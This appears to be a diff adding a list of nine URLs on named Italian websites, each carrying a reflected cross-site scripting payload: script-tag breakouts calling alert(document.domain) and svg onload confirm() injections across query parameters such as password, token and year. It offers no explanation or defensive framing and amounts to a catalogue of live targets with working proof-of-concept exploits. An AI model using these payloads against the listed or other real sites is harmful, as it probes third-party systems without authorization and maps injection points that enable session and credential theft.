@@ -1,0 +1,9 @@
+http://buscaglione.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://chiarascarfi.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://cibusdeorum.it/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+https://burggraeflerhof.it/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E
+https://chescommetti.casino-sicuro.it/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://ciaologo.it/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%272OQtTptrjuLpmECw5BYdU8DGh0S%27)%3C/script%3E
+https://ciarasss92.casino-sicuro.it/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://cicciosapio.casino-sicuro.it/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+https://cirro.it/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
